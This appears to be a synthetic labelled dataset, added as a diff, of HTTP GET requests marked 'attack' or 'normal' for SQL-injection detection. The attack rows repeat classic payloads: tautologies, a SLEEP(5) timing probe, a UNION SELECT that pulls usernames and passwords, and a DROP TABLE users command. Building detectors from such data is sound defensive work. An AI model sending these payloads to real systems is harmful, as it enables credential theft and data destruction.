+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=55 HTTP/1.1,normal,SQLi
+GET /product?id=21 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=38 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=10 HTTP/1.1,normal,SQLi
+GET /product?id=62 HTTP/1.1,normal,SQLi
+GET /product?id=79 HTTP/1.1,normal,SQLi
+GET /product?id=71 HTTP/1.1,normal,SQLi
+GET /product?id=40 HTTP/1.1,normal,SQLi
+GET /product?id=9 HTTP/1.1,normal,SQLi
+GET /product?id=84 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=100 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=44 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=53 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=84 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=27 HTTP/1.1,normal,SQLi
+GET /product?id=48 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=100 HTTP/1.1,normal,SQLi
+GET /product?id=100 HTTP/1.1,normal,SQLi
+GET /product?id=59 HTTP/1.1,normal,SQLi
+GET /product?id=98 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=77 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=92 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=70 HTTP/1.1,normal,SQLi
+GET /product?id=78 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=10 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=20 HTTP/1.1,normal,SQLi
+GET /product?id=8 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=62 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=8 HTTP/1.1,normal,SQLi
+GET /product?id=36 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=71 HTTP/1.1,normal,SQLi
+GET /product?id=17 HTTP/1.1,normal,SQLi
+GET /product?id=5 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=14 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=35 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=71 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=98 HTTP/1.1,normal,SQLi
+GET /product?id=45 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=83 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=19 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=100 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=84 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=56 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=74 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=16 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=58 HTTP/1.1,normal,SQLi
+GET /product?id=61 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=22 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=62 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=52 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=1 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=100 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=99 HTTP/1.1,normal,SQLi
+GET /product?id=24 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=25 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=50 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=36 HTTP/1.1,normal,SQLi
+GET /product?id=39 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=6 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=76 HTTP/1.1,normal,SQLi
+GET /product?id=39 HTTP/1.1,normal,SQLi
+GET /product?id=83 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=74 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=9 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=7 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=46 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=80 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=55 HTTP/1.1,normal,SQLi
+GET /product?id=28 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=22 HTTP/1.1,normal,SQLi
+GET /product?id=81 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=68 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=48 HTTP/1.1,normal,SQLi
+GET /product?id=8 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=96 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=55 HTTP/1.1,normal,SQLi
+GET /product?id=99 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=5 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=85 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=82 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=20 HTTP/1.1,normal,SQLi
+GET /product?id=96 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=63 HTTP/1.1,normal,SQLi
+GET /product?id=16 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=2 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=14 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=62 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=77 HTTP/1.1,normal,SQLi
+GET /product?id=33 HTTP/1.1,normal,SQLi
+GET /product?id=48 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=32 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=21 HTTP/1.1,normal,SQLi
+GET /product?id=71 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=15 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=79 HTTP/1.1,normal,SQLi
+GET /product?id=87 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=82 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=15 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=79 HTTP/1.1,normal,SQLi
+GET /product?id=53 HTTP/1.1,normal,SQLi
+GET /product?id=22 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=94 HTTP/1.1,normal,SQLi
+GET /product?id=59 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=52 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=25 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=53 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=83 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=26 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=70 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=18 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=93 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=35 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=5 HTTP/1.1,normal,SQLi
+GET /product?id=28 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=22 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=15 HTTP/1.1,normal,SQLi
+GET /product?id=16 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=12 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=32 HTTP/1.1,normal,SQLi
+GET /product?id=93 HTTP/1.1,normal,SQLi
+GET /product?id=8 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=13 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=26 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=32 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=89 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=46 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=18 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=85 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=49 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=60 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=54 HTTP/1.1,normal,SQLi
